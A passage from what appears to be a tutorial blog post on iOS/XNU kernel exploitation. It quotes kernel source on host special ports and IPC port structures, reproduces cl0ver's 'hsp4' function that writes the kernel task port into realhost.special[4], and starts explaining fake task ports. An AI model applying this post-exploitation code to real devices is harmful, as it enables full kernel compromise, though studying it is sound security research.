    <span class="mi">097</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_AMFID_PORT</span>			<span class="p">(</span><span class="mi">11</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">098</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_GSSD_PORT</span>			<span class="p">(</span><span class="mi">12</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">099</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_TELEMETRY_PORT</span>		<span class="p">(</span><span class="mi">13</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">100</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_ATM_NOTIFICATION_PORT</span>	<span class="p">(</span><span class="mi">14</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">101</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_COALITION_PORT</span>		<span class="p">(</span><span class="mi">15</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">102</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_SYSDIAGNOSE_PORT</span>           <span class="p">(</span><span class="mi">16</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">103</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_XPC_EXCEPTION_PORT</span>		<span class="p">(</span><span class="mi">17</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">104</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_CONTAINERD_PORT</span>		<span class="p">(</span><span class="mi">18</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">105</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_NODE_PORT</span>			<span class="p">(</span><span class="mi">19</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">106</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_RESOURCE_NOTIFY_PORT</span>	<span class="p">(</span><span class="mi">20</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">107</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_CLOSURED_PORT</span>		<span class="p">(</span><span class="mi">21</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">108</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_SYSPOLICYD_PORT</span>		<span class="p">(</span><span class="mi">22</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">109</span><span class="o">:</span> 
    <span class="mi">110</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_MAX_SPECIAL_PORT</span>		<span class="n">HOST_SYSPOLICYD_PORT</span>
    <span class="mi">111</span><span class="o">:</span>                                         <span class="cm">/* MAX = last since rdar://35861175 */</span>
    <span class="mi">112</span><span class="o">:</span> 
    <span class="mi">113</span><span class="o">:</span> <span class="cm">/* obsolete name */</span>
    <span class="mi">114</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_CHUD_PORT</span> <span class="n">HOST_LAUNCHCTL_PORT</span>
    <span class="mi">115</span><span class="o">:</span> </code></pre></figure>

<p>This contains a bunch of special ports, which as you might have guessed already from the comments, are used for special purposes. From the comments, it is clear that the first seven ports are reserved for the kernel itself. However, only three of them are being used so far. The <strong>HOST_PORT</strong> provides an abstraction over the host and <strong>HOST_PRIV</strong> is used for privileged operations, while the <strong>HOST_IO_MASTER_PORT</strong> is used to interact with devices. Each Host special port is mentioned with a particular number, which is of quite a significance. We can note that <strong>#4</strong> is not being used anywhere.</p>

<p>Another thing worth mentioning is that in order to get send right to a host special port, you need to call <strong>host_get_special_port</strong> with an <strong>int node</strong> parameter, which is the number allocated to that special port.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">kern</span><span class="o">/</span><span class="n">host</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">1193</span><span class="o">:</span> <span class="cm">/*
    1194:  *      User interface for setting a special port.
    1195:  *
    1196:  *      Only permits the user to set a user-owned special port
    1197:  *      ID, rejecting a kernel-owned special port ID.
    1198:  *
    1199:  *      A special kernel port cannot be set up using this
    1200:  *      routine; use kernel_set_special_port() instead.
    1201:  */</span>
    <span class="mi">1202</span><span class="o">:</span> <span class="n">kern_return_t</span>
    <span class="mi">1203</span><span class="o">:</span> <span class="n">host_set_special_port</span><span class="p">(</span><span class="n">host_priv_t</span> <span class="n">host_priv</span><span class="p">,</span> <span class="kt">int</span> <span class="n">id</span><span class="p">,</span> <span class="n">ipc_port_t</span> <span class="n">port</span><span class="p">)</span>
    <span class="mi">1204</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">1205</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">host_priv</span> <span class="o">==</span> <span class="n">HOST_PRIV_NULL</span> <span class="o">||</span> <span class="n">id</span> <span class="o">&lt;=</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span> <span class="o">||</span> <span class="n">id</span> <span class="o">&gt;</span> <span class="n">HOST_MAX_SPECIAL_PORT</span><span class="p">)</span>
    <span class="mi">1206</span><span class="o">:</span> 		<span class="k">return</span> <span class="p">(</span><span class="n">KERN_INVALID_ARGUMENT</span><span class="p">);</span>
    <span class="mi">1207</span><span class="o">:</span> 
    <span class="mi">1208</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">CONFIG_MACF</span>
    <span class="mi">1209</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">mac_task_check_set_host_special_port</span><span class="p">(</span><span class="n">current_task</span><span class="p">(),</span> <span class="n">id</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="mi">1210</span><span class="o">:</span> 		<span class="k">return</span> <span class="p">(</span><span class="n">KERN_NO_ACCESS</span><span class="p">);</span>
    <span class="mi">1211</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">1212</span><span class="o">:</span> 
    <span class="mi">1213</span><span class="o">:</span> 	<span class="k">return</span> <span class="p">(</span><span class="n">kernel_set_special_port</span><span class="p">(</span><span class="n">host_priv</span><span class="p">,</span> <span class="n">id</span><span class="p">,</span> <span class="n">port</span><span class="p">));</span>
    <span class="mi">1214</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">1215</span><span class="o">:</span> 
    <span class="mi">1216</span><span class="o">:</span> <span class="cm">/*
    1217:  *      User interface for retrieving a special port.
    1218:  *
    1219:  *      Note that there is nothing to prevent a user special
    1220:  *      port from disappearing after it has been discovered by
    1221:  *      the caller; thus, using a special port can always result
    1222:  *      in a "port not valid" error.
    1223:  */</span>
    <span class="mi">1224</span><span class="o">:</span> 
    <span class="mi">1225</span><span class="o">:</span> <span class="n">kern_return_t</span>
    <span class="mi">1226</span><span class="o">:</span> <span class="n">host_get_special_port</span><span class="p">(</span><span class="n">host_priv_t</span> <span class="n">host_priv</span><span class="p">,</span> <span class="n">__unused</span> <span class="kt">int</span> <span class="n">node</span><span class="p">,</span> <span class="kt">int</span> <span class="n">id</span><span class="p">,</span> <span class="n">ipc_port_t</span> <span class="o">*</span> <span class="n">portp</span><span class="p">)</span>
    <span class="mi">1227</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">1228</span><span class="o">:</span> 	<span class="n">ipc_port_t</span> <span class="n">port</span><span class="p">;</span>
    <span class="mi">1229</span><span class="o">:</span> 
    <span class="mi">1230</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">host_priv</span> <span class="o">==</span> <span class="n">HOST_PRIV_NULL</span> <span class="o">||</span> <span class="n">id</span> <span class="o">==</span> <span class="n">HOST_SECURITY_PORT</span> <span class="o">||</span> <span class="n">id</span> <span class="o">&gt;</span> <span class="n">HOST_MAX_SPECIAL_PORT</span> <span class="o">||</span> <span class="n">id</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="mi">1231</span><span class="o">:</span> 		<span class="k">return</span> <span class="p">(</span><span class="n">KERN_INVALID_ARGUMENT</span><span class="p">);</span>
    <span class="mi">1232</span><span class="o">:</span> 
    <span class="mi">1233</span><span class="o">:</span> 	<span class="n">host_lock</span><span class="p">(</span><span class="n">host_priv</span><span class="p">);</span>
    <span class="mi">1234</span><span class="o">:</span> 	<span class="n">port</span> <span class="o">=</span> <span class="n">realhost</span><span class="p">.</span><span class="n">special</span><span class="p">[</span><span class="n">id</span><span class="p">];</span>
    <span class="mi">1235</span><span class="o">:</span> 	<span class="o">*</span><span class="n">portp</span> <span class="o">=</span> <span class="n">ipc_port_copy_send</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">1236</span><span class="o">:</span> 	<span class="n">host_unlock</span><span class="p">(</span><span class="n">host_priv</span><span class="p">);</span>
    <span class="mi">1237</span><span class="o">:</span> 
    <span class="mi">1238</span><span class="o">:</span> 	<span class="k">return</span> <span class="p">(</span><span class="n">KERN_SUCCESS</span><span class="p">);</span>
    <span class="mi">1239</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">1240</span><span class="o">:</span> </code></pre></figure>

<p>Looking at the function, we can see that it requires the <strong>host_priv</strong> port as a parameter, and hence executing this call requires root permissions, in addition to all the sandbox checks. The <strong>host_get_special_port</strong> function essentially gets the port value from <strong>realhost.special[node]</strong> and returns it back to the caller.</p>

<p>Coming back to the pointer check, if we can do a remap on the kernel task, write it to the unused port space, which is <strong>realhost.special[4]</strong>, and then call <strong>host_get_special_port(4)</strong>, this should give us a remapped and working kernel task.</p>

<p>The following code snippet from <strong>cl0ver</strong> written by <a href="https://twitter.com/Siguza">Siguza</a> does exactly that</p>

<p>.</p>
<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="n">bool</span> <span class="nf">patch_host_special_port_4</span><span class="p">(</span><span class="n">task_t</span> <span class="n">kernel_task</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">DEBUG</span><span class="p">(</span><span class="s">"Installing host_special_port(4) patch..."</span><span class="p">);</span>

        <span class="n">addr_t</span> <span class="o">*</span><span class="n">special</span> <span class="o">=</span> <span class="p">(</span><span class="n">addr_t</span><span class="o">*</span><span class="p">)</span><span class="n">offsets</span><span class="p">.</span><span class="n">slid</span><span class="p">.</span><span class="n">data_realhost_special</span><span class="p">;</span>
        <span class="n">vm_address_t</span> <span class="n">kernel_task_addr</span><span class="p">,</span>
                     <span class="n">kernel_self_port_addr</span><span class="p">,</span>
                     <span class="n">old_port_addr</span><span class="p">;</span>
        <span class="n">vm_size_t</span> <span class="n">size</span><span class="p">;</span>
        <span class="n">kern_return_t</span> <span class="n">ret</span><span class="p">;</span>

        <span class="c1">// Get address of kernel task</span>
        <span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">kernel_task_addr</span><span class="p">);</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">vm_read_overwrite</span><span class="p">(</span><span class="n">kernel_task</span><span class="p">,</span> <span class="p">(</span><span class="n">vm_address_t</span><span class="p">)</span><span class="n">offsets</span><span class="p">.</span><span class="n">slid</span><span class="p">.</span><span class="n">data_kernel_task</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">kernel_task_addr</span><span class="p">),</span> <span class="p">(</span><span class="n">vm_address_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">kernel_task_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">THROW</span><span class="p">(</span><span class="s">"Failed to get kernel task address: %s"</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">ret</span><span class="p">));</span>
        <span class="p">}</span>
        <span class="n">DEBUG</span><span class="p">(</span><span class="s">"Kernel task address: "</span> <span class="n">ADDR</span><span class="p">,</span> <span class="p">(</span><span class="n">addr_t</span><span class="p">)</span><span class="n">kernel_task_addr</span><span class="p">);</span>

        <span class="c1">// Get address of kernel task/self port</span>
        <span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">kernel_self_port_addr</span><span class="p">);</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">vm_read_overwrite</span><span class="p">(</span><span class="n">kernel_task</span><span class="p">,</span> <span class="n">kernel_task_addr</span> <span class="o">+</span> <span class="n">offsets</span><span class="p">.</span><span class="n">unslid</span><span class="p">.</span><span class="n">off_task_itk_self</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">kernel_self_port_addr</span><span class="p">),</span> <span class="p">(</span><span class="n">vm_address_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">kernel_self_port_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">THROW</span><span class="p">(</span><span class="s">"Failed to get kernel task port address: %s"</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">ret</span><span class="p">));</span>
        <span class="p">}</span>
        <span class="n">DEBUG</span><span class="p">(</span><span class="s">"Kernel task port address: "</span> <span class="n">ADDR</span><span class="p">,</span> <span class="p">(</span><span class="n">addr_t</span><span class="p">)</span><span class="n">kernel_self_port_addr</span><span class="p">);</span>

        <span class="c1">// Check if realhost.special[4] is set already</span>
        <span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">old_port_addr</span><span class="p">);</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">vm_read_overwrite</span><span class="p">(</span><span class="n">kernel_task</span><span class="p">,</span> <span class="p">(</span><span class="n">vm_address_t</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">special</span><span class="p">[</span><span class="mi">4</span><span class="p">]),</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">old_port_addr</span><span class="p">),</span> <span class="p">(</span><span class="n">vm_address_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">old_port_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">THROW</span><span class="p">(</span><span class="s">"Failed to read realhost.special[4]: %s"</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">ret</span><span class="p">));</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="n">old_port_addr</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="n">old_port_addr</span> <span class="o">==</span> <span class="n">kernel_self_port_addr</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">DEBUG</span><span class="p">(</span><span class="s">"Patch already in place, nothing to do"</span><span class="p">);</span>
                <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">else</span>
            <span class="p">{</span>
                <span class="n">THROW</span><span class="p">(</span><span class="s">"realhost.special[4] has a valid port already"</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="c1">// Write to realhost.special[4]</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">vm_write</span><span class="p">(</span><span class="n">kernel_task</span><span class="p">,</span> <span class="p">(</span><span class="n">vm_address_t</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">special</span><span class="p">[</span><span class="mi">4</span><span class="p">]),</span> <span class="p">(</span><span class="n">vm_address_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">kernel_self_port_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">kernel_self_port_addr</span><span class="p">));</span>
        <span class="k">if</span><span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">THROW</span><span class="p">(</span><span class="s">"Failed to patch realhost.special[4]: %s"</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">ret</span><span class="p">));</span>
        <span class="p">}</span>

        <span class="n">DEBUG</span><span class="p">(</span><span class="s">"Successfully installed patch"</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<p>This technique is also known as the <strong>hsp4</strong> patch and widely used in some of the recent jailbreaks.</p>

<h2 id="faking-task-ports">Faking Task Ports</h2>

<p>One of the most common techniques used in some of the recent jailbreaks is that of using Fake ports. The idea is to make the kernel look up a user controlled memory space thinking that it is a port. Using certain APIs, we can then extract data out of the kernel.</p>

<p>Let’s have a look at the stripped port structure which can be found in <strong>osfmk/ipc/ipc_port.h</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_port</span><span class="p">.</span><span class="n">h</span><span class="err">}</span>
    <span class="mi">112</span><span class="o">:</span> 
    <span class="mi">113</span><span class="o">:</span> <span class="k">struct</span> <span class="n">ipc_port</span> <span class="p">{</span>
    <span class="mi">114</span><span class="o">:</span> 
    <span class="mi">115</span><span class="o">:</span> 	<span class="cm">/*
    116: 	 * Initial sub-structure in common with ipc_pset
    117: 	 * First element is an ipc_object second is a
    118: 	 * message queue
    119: 	 */</span>
    <span class="mi">120</span><span class="o">:</span> 	<span class="k">struct</span> <span class="n">ipc_object</span> <span class="n">ip_object</span><span class="p">;</span>
    <span class="mi">121</span><span class="o">:</span> 	<span class="k">struct</span> <span class="n">ipc_mqueue</span> <span class="n">ip_messages</span><span class="p">;</span>
    <span class="mi">122</span><span class="o">:</span> 
    <span class="mi">123</span><span class="o">:</span> 	<span class="k">union</span> <span class="p">{</span>
    <span class="mi">124</span><span class="o">:</span> 		<span class="k">struct</span> <span class="n">ipc_space</span> <span class="o">*</span><span class="n">receiver</span><span class="p">;</span>
    <span class="mi">125</span><span class="o">:</span> 		<span class="k">struct</span> <span class="n">ipc_port</span> <span class="o">*</span><span class="n">destination</span><span class="p">;</span>
    <span class="mi">126</span><span class="o">:</span> 		<span class="n">ipc_port_timestamp_t</span> <span class="n">timestamp</span><span class="p">;</span>
    <span class="mi">127</span><span class="o">:</span> 	<span class="p">}</span> <span class="n">data</span><span class="p">;</span>
    <span class="mi">128</span><span class="o">:</span> 
    <span class="mi">129</span><span class="o">:</span> 	<span class="k">union</span> <span class="p">{</span>
    <span class="mi">130</span><span class="o">:</span> 		<span class="n">ipc_kobject_t</span> <span class="n">kobject</span><span class="p">;</span>
    <span class="mi">131</span><span class="o">:</span> 		<span class="n">ipc_importance_task_t</span> <span class="n">imp_task</span><span class="p">;</span>
    <span class="mi">132</span><span class="o">:</span> 		<span class="n">ipc_port_t</span> <span class="n">sync_inheritor_port</span><span class="p">;</span>
    <span class="mi">133</span><span class="o">:</span> 		<span class="k">struct</span> <span class="n">knote</span> <span class="o">*</span><span class="n">sync_inheritor_knote</span><span class="p">;</span>
    <span class="mi">134</span><span class="o">:</span> 		<span class="k">struct</span> <span class="n">turnstile</span> <span class="o">*</span><span class="n">sync_inheritor_ts</span><span class="p">;</span>
    <span class="mi">135</span><span class="o">:</span> 	<span class="p">}</span> <span class="n">kdata</span><span class="p">;</span>
    <span class="mi">136</span><span class="o">:</span> 
    <span class="mi">137</span><span class="o">:</span> 	<span class="k">struct</span> <span class="n">ipc_port</span> <span class="o">*</span><span class="n">ip_nsrequest</span><span class="p">;</span>
    <span class="mi">138</span><span class="o">:</span> 	<span class="k">struct</span> <span class="n">ipc_port</span> <span class="o">*</span><span class="n">ip_pdrequest</span><span class="p">;</span>
    <span class="mi">139</span><span class="o">:</span> 	<span class="k">struct</span> <span class="n">ipc_port_request</span> <span class="o">*</span><span class="n">ip_requests</span><span class="p">;</span>
    <span class="mi">140</span><span class="o">:</span> 	<span class="k">union</span> <span class="p">{</span>
    <span class="mi">141</span><span class="o">:</span> 		<span class="k">struct</span> <span class="n">ipc_kmsg</span> <span class="o">*</span><span class="n">premsg</span><span class="p">;</span>
    <span class="mi">142</span><span class="o">:</span> 		<span class="k">struct</span> <span class="n">turnstile</span> <span class="o">*</span><span class="n">send_turnstile</span><span class="p">;</span>
    <span class="mi">143</span><span class="o">:</span> 		<span class="n">SLIST_ENTRY</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">)</span> <span class="n">dealloc_elm</span><span class="p">;</span>
    <span class="mi">144</span><span class="o">:</span> 	<span class="p">}</span> <span class="n">kdata2</span><span class="p">;</span>
   </code></pre></figure>

<p>The first attribute is an <strong>ipc_object</strong> struct that can be found in <strong>osfmk/ipc/ipc_object.h</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_object</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">088</span><span class="o">:</span> <span class="cm">/*
    089:  * The ipc_object is used to both tag and reference count these two data
    090:  * structures, and (Noto Bene!) pointers to either of these or the
    091:  * ipc_object at the head of these are freely cast back and forth; hence
    092:  * the ipc_object MUST BE FIRST in the ipc_common_data.
    093:  * 
    094:  * If the RPC implementation enabled user-mode code to use kernel-level
    095:  * data structures (as ours used to), this peculiar structuring would
    096:  * avoid having anything in user code depend on the kernel configuration
    097:  * (with which lock size varies).
    098:  */</span>
    <span class="mi">099</span><span class="o">:</span> <span class="k">struct</span> <span class="n">ipc_object</span> <span class="p">{</span>
    <span class="mi">100</span><span class="o">:</span> 	<span class="n">ipc_object_bits_t</span> <span class="n">io_bits</span><span class="p">;</span>
    <span class="mi">101</span><span class="o">:</span> 	<span class="n">ipc_object_refs_t</span> <span class="n">io_references</span><span class="p">;</span>
    <span class="mi">102</span><span class="o">:</span> 	<span class="n">lck_spin_t</span>	<span class="n">io_lock_data</span><span class="p">;</span>
    <span class="mi">103</span><span class="o">:</span> <span class="p">};</span></code></pre></figure>

<p>The first field is <strong>io_bits</strong>, the details about these bits can be found under <strong>osfmk/ipc/ipc_object.h</strong></p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_object</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">124</span><span class="o">:</span> <span class="cm">/*
    125:  *	IPC steals the high-order bits from the kotype to use
    126:  *	for its own purposes.  This allows IPC to record facts
    127:  *	about ports that aren't otherwise obvious from the
    128:  *	existing port fields.  In particular, IPC can optionally
    129:  *	mark a port for no more senders detection.  Any change
    130:  *	to IO_BITS_PORT_INFO must be coordinated with bitfield
    131:  *	definitions in ipc_port.h.
    132:  */</span>
    <span class="mi">133</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IO_BITS_PORT_INFO</span>	<span class="mh">0x0000f000</span>	<span class="cm">/* stupid port tricks */</span>
    <span class="mi">134</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IO_BITS_KOTYPE</span>		<span class="mh">0x00000fff</span>	<span class="cm">/* used by the object */</span>
    <span class="mi">135</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IO_BITS_OTYPE</span>		<span class="mh">0x7fff0000</span>	<span class="cm">/* determines a zone */</span>
    <span class="mi">136</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IO_BITS_ACTIVE</span>		<span class="mh">0x80000000</span>	<span class="cm">/* is object alive? */</span>
    <span class="mi">137</span><span class="o">:</span> 
    <span class="mi">138</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">io_active</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>		<span class="p">(((</span><span class="n">io</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">io_bits</span> <span class="o">&amp;</span> <span class="n">IO_BITS_ACTIVE</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="mi">139</span><span class="o">:</span> 
    <span class="mi">140</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">io_otype</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>		<span class="p">(((</span><span class="n">io</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">io_bits</span> <span class="o">&amp;</span> <span class="n">IO_BITS_OTYPE</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span>
    <span class="mi">141</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">io_kotype</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>		<span class="p">((</span><span class="n">io</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">io_bits</span> <span class="o">&amp;</span> <span class="n">IO_BITS_KOTYPE</span><span class="p">)</span>
    <span class="mi">142</span><span class="o">:</span> 
    <span class="mi">143</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">io_makebits</span><span class="p">(</span><span class="n">active</span><span class="p">,</span> <span class="n">otype</span><span class="p">,</span> <span class="n">kotype</span><span class="p">)</span>	\
    <span class="mi">144</span><span class="o">:</span> 	<span class="p">(((</span><span class="n">active</span><span class="p">)</span> <span class="o">?</span> <span class="n">IO_BITS_ACTIVE</span> <span class="o">:</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="n">otype</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">kotype</span><span class="p">))</span>
    <span class="mi">145</span><span class="o">:</span> 
    <span class="mi">146</span><span class="o">:</span> <span class="cm">/*
    147:  * Object types: ports, port sets, kernel-loaded ports
    148:  */</span>
    <span class="mi">149</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IOT_PORT</span>		<span class="mi">0</span>
    <span class="mi">150</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IOT_PORT_SET</span>		<span class="mi">1</span>
    <span class="mi">151</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IOT_NUMBER</span>		<span class="mi">2</span>		<span class="cm">/* number of types used */</span>
    <span class="mi">152</span><span class="o">:</span> </code></pre></figure>

<p>The <strong>IO_BITS_ACTIVE</strong> needs to be set to make sure the object is alive. The <strong>IO_BITS_OTYPE</strong> specifies the object type. The <strong>IO_BITS_KOTYPE</strong> field that determines what kind of port it is, whether it is a task port, or a clock port etc. While creating a fake port, you need to specify these values in the <strong>io_bits</strong> field. A full list can be found under <strong>osfmk/kern/ipc_kobject.h</strong></p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">EXPORT_HDRS</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">kern</span><span class="o">/</span><span class="n">ipc_kobject</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">091</span><span class="o">:</span> 
    <span class="mi">092</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_NONE</span>				<span class="mi">0</span>
    <span class="mi">093</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_THREAD</span>				<span class="mi">1</span>
    <span class="mi">094</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_TASK</span>				<span class="mi">2</span>
    <span class="mi">095</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_HOST</span>				<span class="mi">3</span>
    <span class="mi">096</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_HOST_PRIV</span>			<span class="mi">4</span>
    <span class="mi">097</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_PROCESSOR</span>			<span class="mi">5</span>
    <span class="mi">098</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_PSET</span>				<span class="mi">6</span>
    <span class="mi">099</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_PSET_NAME</span>			<span class="mi">7</span>
